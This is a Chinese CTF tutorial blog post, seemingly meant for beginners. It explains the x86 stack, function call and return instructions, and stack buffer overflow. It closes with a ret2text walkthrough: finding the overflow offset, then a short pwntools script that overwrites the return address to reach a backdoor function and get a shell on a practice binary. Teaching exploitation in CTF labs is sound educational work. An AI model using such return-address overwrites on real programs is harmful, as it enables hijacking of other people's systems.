    <content type="html"><![CDATA[<h2 id="认识栈结构"><a href="#认识栈结构" class="headerlink" title="认识栈结构"></a>认识栈结构</h2><p><strong>栈这种结构学过数据结构的都知道，是一种先进后出的结构，类似于子弹放进弹夹一样，先放进的子弹最后打出。</strong></p><h2 id="函数调用过程"><a href="#函数调用过程" class="headerlink" title="函数调用过程"></a>函数调用过程</h2><p><strong>这个知识是整个栈方面的关键知识，我在大一的时候学pwn怎么也学不会，就是忽略了对基础知识的学习，直接学漏洞，一直搞不清怎么回事，非常郁闷。现在详细总结一下函数调用过程，以X86系统为例</strong></p><ol><li><p>压入参数<br><strong>根据调用约定压入参数，main函数作为调用者，首先将fun的参数a,b…压栈。栈是向下生长的，先压入的参数靠近栈顶esp，后压入的靠近栈底edp</strong></p></li><li><p>返回地址压入<br><strong>fun函数调用完成，程序需要返回源地址继续执行程序，那么我们就去要保存调用函数下一句的地址，把它压入栈中，以便我们恢复原程序继续执行</strong></p></li><li><p>fun函数运行<br><strong>fun函数运行会给自己再开辟一个栈，这个栈的栈底就是上个栈的栈顶，因为当调用函数时，执行call命令，会执行这几条汇编‘push edp；mov edp ，esp；sub esp，0x ’这句话可以画图来体会一下。push edp；是为了保存调用函数的栈帧，调用函数结束后要恢复原函数的edp，esp。mov edp ，esp；把esp的值赋值给edp，这样就把新栈帧的栈底确定了。sub esp ，0x，这句话为栈开辟空间，esp就确定了，完成一个新栈开辟</strong><br><img src="/2024/07/18/hello-world/4-20240615145957921-1237740954.png"></p></li><li><p>fun函数返回<br><strong>当函数运行完成之后，函数这么返回呢？函数一般会执行‘leave；ret；’这句话什么含义，就是‘mov esp ，edp；pop edp；pop eip’ 我们来解读一下，首先把栈顶移动到栈底，相当于恢复栈顶，仔细想一想，是不是fun调用的时候，把edp移动到esp。然后pop edp 把栈中压入的main_edp弹出赋值给edp，这样我们就恢复了edp，然后再pop eip，把压入的main_addr弹出赋值给eip程序控制流就有回到了call的下一句</strong><br><img src="/2024/07/18/hello-world/4-20240615145935251-58146433.png"></p></li></ol><h3 id="函数调用过程中涉及操作指令"><a href="#函数调用过程中涉及操作指令" class="headerlink" title="函数调用过程中涉及操作指令"></a>函数调用过程中涉及操作指令</h3><ol><li><strong>压栈(push):栈顶指针esp减小4字节;以字节为单位将寄存器数据(4字节，不足补0)压入堆栈，从高到低依次将数据存人esp-1、esp-2、esp-3、esp-4指向的地址单元。</strong></li><li><strong>出栈(pop):栈顶指针esp指向的栈中数据被取回寄存器;栈顶指针esp增加4字节。push和pop指令在不同系统上运行时稍有不同，在64位系统中变化的大小是8字节，在32位系统中变化的大小是4字节。</strong></li><li><strong>调用(ca11):将当前的指令指针eip(该指针指向ca11指令后的下条指令)压入堆栈，以返回时能恢复执行下条指令。然后，设置eip指向被调函数的开始处，以跳转到被调函数的入口地址处执行。</strong></li><li><strong>离开(1eave):恢复主调函数的栈帧以准备返回，它等价于以下指令序列:mov esp，ebp(恢复原esp值，指向被调函数栈帧开始处); pop ebp(恢复原 ebp 的值，即主调函数帧基指针)</strong></li><li><strong>返回(ret):与ca11指令配合，用于从函数或过程返回。从栈顶弹出返回地址(之前 ca11指令保存的下条指令地址)到eip寄存器中，程序转到该地址处继续执行(此时 esp指向进人函数时的第一个参数)。若带有立即数，esp要加上立即数(丢弃一些在执行ca11指令前入栈的参数)。使用该指令前，应使当前栈顶指针所指向位置的内容正好是先前ca11指令保存的返回地址。</strong></li></ol><h2 id="初识栈溢出"><a href="#初识栈溢出" class="headerlink" title="初识栈溢出"></a>初识栈溢出</h2><p><strong>当我们调用一个函数的时候，在函数内部存在，栈溢出漏洞，get函数或者开辟空间大于变量距离栈底的位置，那么就可能造成栈溢出，溢出后如果溢出值覆盖了main_addr,函数的返回地址就会变化，我们可以根据这个特点，篡改返回地址到我们想返回的。看下图，距离栈底0x80个字节，但是允许读取0x200个字节，就会造成栈溢出,接下来我们来小试牛刀</strong><br><img src="/2024/07/18/hello-world/4-20240615151711628-1251544727.png"><br>例题：<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2text">https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2text</a><br><img src="/2024/07/18/hello-world/4-20240616153452139-148592813.png"><br><strong>查看保护</strong><br><strong>打开IDA反编译看看代码逻辑</strong><br><img src="/2024/07/18/hello-world/4-20240616153558140-1955505298.png"><br><strong>这里有两种判断偏移的方式</strong></p><ol><li>第一种就是看图片上红框部分，显示s距离ebp为0x108个字节所以需要填充0x108+0x4个字节的数据才能覆盖返回地址</li><li>使用pwngdb中cyclic判断偏移，在call gets处下断点，用gdb调试<img src="/%5C%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA%5C1.png"><br>用cyclic生成有规律的字符串，输入c把字符串输入运行<img src="/2024/07/18/hello-world/4-20240616154222037-23893821.png"><br>得到一个异常返回地址，程序停止<img src="/2024/07/18/hello-world/4-20240616154349804-1239461694.png"><br>用命令cyclic -l 加返回地址算出偏移<img src="/2024/07/18/hello-world/4-20240616154515354-1776521236.png"><br>这里的到的偏移就不用算edp的大小了，因为已经包括edp了<br><strong>有了偏移我们找一下后门函数</strong><img src="/2024/07/18/hello-world/4-20240616154752242-424300469.png"><br><strong>这题也算很仁慈，直接给出了后门函数，我们随着学习的深入，一般不会直接给出后门函数，需要使用各种技巧来进入shell</strong><br><img src="/2024/07/18/hello-world/4-20240616154930333-1601063843.png"><br><strong>接下来开始编写脚本</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br><br>p = process(&quot;./ret2text&quot;)<br>target = 0x0804850B<br>p.recvuntil(&quot;ret2text\n&quot;)<br>payload = b&quot;a&quot; * 0x108 + p32(1) + p32(target)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
